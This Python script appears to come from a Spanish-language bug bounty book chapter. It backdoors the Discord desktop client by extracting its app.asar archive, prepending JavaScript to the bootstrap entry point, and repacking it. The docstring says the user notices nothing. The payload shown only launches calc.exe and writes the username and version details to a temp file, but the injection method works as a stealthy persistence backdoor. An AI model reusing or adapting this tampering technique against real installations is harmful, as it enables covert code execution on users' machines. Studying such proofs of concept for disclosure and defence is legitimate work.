# Extraído de: LibroBugBounty/cap-26-caso-discord.md
"""
discord_asar_rce.py -- ASAR Tampering RCE
Inyecta payload en el main entry point de Discord.
Discord se comporta con normalidad; el usuario no nota nada.
"""
import os, shutil, subprocess, tempfile, hashlib
from pathlib import Path

DISCORD_BASE = Path(os.environ["LOCALAPPDATA"]) / "Discord"

def find_discord_version():
    """Encontrar la version mas reciente instalada."""
    versions = sorted([
        d for d in DISCORD_BASE.iterdir()
        if d.is_dir() and d.name.startswith("app-")
    ])
    return versions[-1] if versions else None

def create_backdoored_asar(app_dir):
    """Crear ASAR modificado con payload."""
    original = app_dir / "resources" / "app.asar"
    extract_dir = tempfile.mkdtemp(prefix="discord_")

    # Extraer ASAR original
    subprocess.run([
        "npx", "@electron/asar", "extract",
        str(original), extract_dir
    ], capture_output=True, shell=True)

    # Inyectar payload en el entry point
    index_js = Path(extract_dir) / "app_bootstrap" / "index.js"
    original_code = index_js.read_text(encoding="utf-8")

    payload = '''
// === PoC: Prueba de ejecucion de codigo ===
try {
    const { execSync } = require('child_process');
    const fs = require('fs');
    const os = require('os');
    // Prueba visual
    execSync('calc.exe', { windowsHide: false });
    // Evidencia
    const evidence = {
        timestamp: new Date().toISOString(),
        poc: 'Discord ASAR RCE',
        user: os.userInfo().username,
        pid: process.pid,
        electron: process.versions.electron,
        node: process.versions.node
    };
    fs.writeFileSync(
        os.tmpdir() + '/discord_rce_evidence.json',
        JSON.stringify(evidence, null, 2)
    );
} catch(e) {}
// === Fin PoC ===
'''

    index_js.write_text(
        payload + '\n' + original_code,
        encoding="utf-8"
    )

    # Reempaquetar
    output = Path(tempfile.gettempdir()) / "backdoored.asar"
    subprocess.run([
        "npx", "@electron/asar", "pack",
        extract_dir, str(output)
    ], capture_output=True, shell=True)

    shutil.rmtree(extract_dir, ignore_errors=True)
    return output
